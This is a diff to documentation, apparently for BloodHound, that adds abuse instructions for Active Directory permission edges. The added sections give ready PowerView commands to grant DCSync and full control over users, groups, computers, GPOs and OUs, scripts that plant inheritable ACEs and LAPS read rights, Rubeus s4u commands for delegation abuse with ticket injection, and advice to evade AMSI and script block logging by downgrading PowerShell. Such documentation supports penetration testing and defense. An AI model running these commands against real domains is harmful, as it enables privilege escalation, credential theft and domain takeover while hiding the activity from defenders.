@@ -795,7 +795,7 @@ Author: Scott Sutherland
 References
 ----------
 
-* https://github.com/NetSPI/PowerUpSQL/wiki</a>
+* https://github.com/NetSPI/PowerUpSQL/wiki
 * https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation
 * https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver
 * https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017
@@ -845,12 +845,12 @@ for more information.
 References
 ----------
 
-* https://github.com/GhostPack/Rubeus#s4u</a>
-* https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a>
-* http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>
-* https://twitter.com/gentilkiwi/status/806643377278173185</a>
-* https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a>
-* http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</a>
+* https://github.com/GhostPack/Rubeus#s4u
+* https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
+* http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
+* https://twitter.com/gentilkiwi/status/806643377278173185
+* https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more
+* http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/
 * http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
 
 GetChanges/GetChangesAll
@@ -1100,130 +1100,436 @@ on the object.
 AbuseInfo
 ---------
 
-..todo:: write this
+With the ability to modify the DACL on the target object, you can grant yourself almost any
+privilege against the object you wish.
+
+**Groups**
+
+With WriteDACL over a group, grant yourself the right to add members to the group:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
+
+See the abuse info for AddMembers edge for more information about execution the attack from
+there.
+
+**Users**
+
+With WriteDACL over a user, grant yourself full control of the user object:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All
+
+See the abuse info for ForceChangePassword and GenericAll over a user for more infromation
+about how to continue from there.
+
+**Computers**
+
+With WriteDACL over a computer object, grant yourself full control of the computer
+object:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity windows1 -Rights All
+
+Then either read the LAPS password attribute for the computer or perform resource-based
+constrained delegation against the target computer.
+
+**Domains**
+
+With WriteDACL against a domain object, grant yourself the ability to DCSync:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
+
+Then perform the DCSync attack.
+
+**GPOs**
+
+With WriteDACL over a GPO, grant yourself full control of the GPO:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All
+
+Then edit the GPO to take over an object the GPO applies to.
+
+**OUs**
+
+With WriteDACL over an OU, grant yourself full control of the OU:
+
+::
+
+  Add-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All
+
+Then add a new ACE to the OU that inherits down to child objects to take over
+those child objects.
 
 Opsec Considerations
 --------------------
 
+When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
+mechanisms that make it much easier for defenders to see what's going on with PowerShell in their
+network, such as script block logging and AMSI. You can bypass those security mechanisms by
+downgrading to PowerShell v2, which all PowerView functions support.
+
+Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
+that handled the request.
+            
+Additional opsec considerations depend on the target object and how to take advantage of this
+privilege.
+
 References
 ----------
 
+* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+* https://www.youtube.com/watch?v=z8thoG7gPd0
+* https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
+* https://github.com/GhostPack/Rubeus#s4u
+* https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
+* http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
+* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+* https://github.com/Kevin-Robertson/Powermad#new-machineaccount
+* https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8
+
 GenericWrite
 ^^^^^^^^^^^^
+Generic Write access grants you the ability to write to any non-protected attribute on the target
+object, including "members" for a group, and "serviceprincipalnames" for a user
 
 AbuseInfo
 ---------
 
+**Users**
+
+With GenericWrite over a user, perform a targeted kerberoasting attack. See the abuse section
+under the GenericAll edge for more information
+
+**Groups**
+
+With GenericWrite over a group, add yourself or another principal you control to the group.
+See the abuse info under the AddMembers edge for more information
+
+**Computers**
+
+With GenericWrite over a computer, perform resource-based constrained delegation against the
+computer. See the GenericAll edge abuse info for more information about that attack.
+
 Opsec Considerations
 --------------------
 
+This will depend on which type of object you are targetting and the attack you perform. See
+the relevant edge for opsec considerations for the actual attack you perform.
+
 References
 ----------
+
+https://www.youtube.com/watch?v=z8thoG7gPd0
 
 WriteOwner
 ^^^^^^^^^^
 
+Object owners retain the ability to modify object security descriptors, regardless of
+permissions on the object's DACL.
+
 AbuseInfo
 ---------
+
+To change the ownership of the object, you may use the Set-DomainObjectOwner function in
+PowerView.
+
+To abuse this privilege with PowerView's Set-DomainObjectOwner, first import PowerView
+into your agent session or into a PowerShell instance at the console. You may need to
+authenticate to the Domain Controller as the user with the password reset privilege if
+you are not running a process as that user.
+
+To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object
+(these examples comes from the PowerView help documentation):
+
+::
+
+  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+  $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
+
+Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already
+running a process as the user with this privilege:
+
+::
+
+  Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
+
+Now, with ownership of the object, you may modify the DACL of the object however you wish.
+For more information about that, see the WriteDacl edge section.
 
 Opsec Considerations
 --------------------
 
+This depends on the target object and how to take advantage of this privilege.
+
+When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
+mechanisms that make it much easier for defenders to see what's going on with PowerShell in
+their network, such as script block logging and AMSI. You can bypass those security mechanisms
+by downgrading to PowerShell v2, which all PowerView functions support.
+
+Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
+that handled the request.
+
 References
 ----------
+
+https://www.youtube.com/watch?v=z8thoG7gPd0
 
 Owns
 ^^^^
 
+Object owners retain the ability to modify object security descriptors, regardless of permissions
+on the object's DACL
+
 AbuseInfo
 ---------
+
+With ownership of the object, you may modify the DACL of the object however you wish.
+For more information about that, see the WriteDacl edge section.
 
 Opsec Considerations
 --------------------
 
+This depends on the target object and how to take advantage of this privilege.
+
+When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
+mechanisms that make it much easier for defenders to see what's going on with PowerShell in
+their network, such as script block logging and AMSI. You can bypass those security mechanisms
+by downgrading to PowerShell v2, which all PowerView functions support.
+
+Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
+that handled the request.
+
 References
 ----------
+
+https://www.youtube.com/watch?v=z8thoG7gPd0
 
 Contains
 ^^^^^^^^
 
+GPOs linked to a container apply to all objects that are contained by the container. Additionally,
+ACEs set on a parent OU may inherit down to child objects.
+
 AbuseInfo
 ---------
+
+With control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that
+OU. Below are two options depending on how targeted you choose to be in this step:
+
+Generic Descendent Object Takeover:
+
+The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU
+that will inherit down to all object types. Again, this can be done using PowerView. This time we will use
+the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.
+
+First, we need to reference the OU by its ObjectGUID, not its name. You can find the ObjectGUID for the OU
+in the BloodHound GUI by clicking the OU, then inspecting the *objectid* value
+
+Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':
+
+::
+
+  $Guids = Get-DomainGUIDMap
+  $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
+
+Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of
+all descendant objects:
+
+::
+
+  ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
+
+Finally, we will apply this ACE to our target OU:
+
+::
+
+  $OU = Get-DomainOU -Raw (OU GUID)
+  $DsEntry = $OU.GetDirectoryEntry()
+  $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+  $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+  $dsEntry.PsBase.CommitChanges()</code>
+
+Now, the "JKOHLER" user will have full control of all descendent objects of each type.
+
+Targeted Descendent Object Takeoever:
+
+If you want to be more targeted with your approach, it is possible to specify precisely what right you want
+to apply to precisely which kinds of descendent objects. You could, for example, grant a user
+"ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every
+GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the
+"ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:
+
+::
+
+  $Guids = Get-DomainGUIDMap
+  $AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
+  $CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
+  $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
+  $OU = Get-DomainOU -Raw Workstations
+  $DsEntry = $OU.GetDirectoryEntry()
+  $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+  $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+  $dsEntry.PsBase.CommitChanges()
 
 Opsec Considerations
 --------------------
 
+.. todo:: add opsec considerations
+
 References
 ----------
+
+* https://wald0.com/?p=179
+* https://blog.cptjesus.com/posts/bloodhound15
 
 AllExtendedRights
 ^^^^^^^^^^^^^^^^^
 
+Extended rights are special rights granted on objects which allow reading of privileged
+attributes, as well as performing special actions.
+
 AbuseInfo
 ---------
+
+**Users**
+
+Having this privilege over a user grants the ability to reset the user's password. For
+more information about that, see the ForceChangePassword edge section
+
+**Groups**
+
+This privilege grants the ability to modify group memberships. For more information on
+that, see the AddMembers edge section
+
+**Computers**
+
+You may perform resource-based constrained delegation with this privilege over a computer
+object. For more information about that, see the GenericAll edge section.
 
 Opsec Considerations
 --------------------
 
+This will depend on the actual attack performed. See the particular opsec considerations
+sections for the ForceChangePassword, AddMembers, and GenericAll edges for more info
+
 References
 ----------
+
+https://www.youtube.com/watch?v=z8thoG7gPd0
 
 GpLink
 ^^^^^^
 
-AbuseInfo
----------
-
-Opsec Considerations
---------------------
-
-References
-----------
-
-WriteOwner
-^^^^^^^^^^
+A linked GPO applies its settings to objects in the linked container.
 
 AbuseInfo
 ---------
 
+This edge helps you understand which object a GPO applies to, and so the actual abuse
+is actually being performed against the GPO this edge originates from. For more info
+about that abuse, see the GenericAll edge section for when you have full control over
+a GPO.
+
 Opsec Considerations
 --------------------
 
+See the GenericAll edge section for opsec considerations
+
 References
 ----------
+
+https://wald0.com/?p=179
 
 AllowedToAct
 ^^^^^^^^^^^^
 
+An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to
+impersonate any domain user to the target computer system and receive a valid service
+ticket "as" this user.
+
+One caveat is that impersonated users can not be in the "Protected Users" security group
+or otherwise have delegation privileges revoked. Another caveat is that the principal
+added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal
+name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an
+attacker does not currently control an account with a SPN set, an attacker can abuse the
+default domain MachineAccountQuota settings to add a computer account that the attacker
+controls via the Powermad project.
+
 AbuseInfo
 ---------
+
+Abusing this primitive is currently only possible through the Rubeus project.
+            
+To use this attack, the controlled account MUST have a service principal name set, along
+with access to either the plaintext or the RC4_HMAC hash of the account.
+
+If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:
+
+::
+
+  Rubeus.exe hash /password:Summer2018!
+
+Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to
+"pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case
+grants us access to the file system of the TARGETCOMPUTER:
+    
+::
+
+  Rubeus.exe s4u /user:<trusted user> /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
 
 Opsec Considerations
 --------------------
 
+To execute this attack, the Rubeus C# assembly needs to be executed on some system with the
+ability to send/receive traffic in the domain.
+
 References
 ----------
+
+* https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
+* https://github.com/GhostPack/Rubeus#s4u
+* https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
+* http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
+* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+* https://github.com/Kevin-Robertson/Powermad#new-machineaccount
 
 AddAllowedToAct
 ^^^^^^^^^^^^^^^
 
+The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker
+to abuse resource-based constrained delegation to compromise the remote computer system. This
+property is a binary DACL that controls what security principals can pretend to be any domain
+user to the particular computer object.
+
 AbuseInfo
 ---------
+
+See the AllowedToAct edge section for abuse info
 
 Opsec Considerations
 --------------------
 
+See the AllowedToAct edge section for opsec considerations
+
 References
 ----------
+
+* https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
+* https://github.com/GhostPack/Rubeus#s4u
+* https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
+* http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
+* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+* https://github.com/Kevin-Robertson/Powermad#new-machineaccount
 
 TrustedBy
 ^^^^^^^^^
 
-AbuseInfo
----------
-
-Opsec Considerations
---------------------
-
-References
-----------
+.. todo:: Flesh out this section
